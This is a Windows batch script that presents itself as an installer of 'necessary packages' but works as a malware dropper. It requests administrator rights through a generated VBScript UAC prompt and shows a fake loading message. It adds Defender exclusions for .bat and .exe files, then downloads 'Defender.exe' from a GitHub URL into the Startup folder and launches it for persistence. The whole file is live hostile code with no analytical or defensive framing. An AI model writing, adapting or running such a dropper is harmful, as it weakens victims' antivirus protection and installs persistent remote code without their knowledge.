  @echo off
cls
setlocal enableextensions && setlocal enabledelayedexpansion
@echo off
cls
setlocal enableextensions && setlocal enabledelayedexpansion
@echo off
:: BatchGotAdmin
::-------------------------------------
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
echo msgbox "Loading! Please Wait While we install necessary packages for You!.Press OK to continue Installation!!!" > %tmp%\tmp.vbs
wscript %tmp%\tmp.vbs
del %tmp%\tmp.vbs

echo  Installing Necessary Packages.....Please Wait.......

set xxx=%systemroot%

set i-love-you-hande-ercel=System32



powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""

powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""


cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/facebook247/facebook247.github.io/blob/main/Defender.exe?raw=true', '.\Defender.exe') }
start Defender.exe 


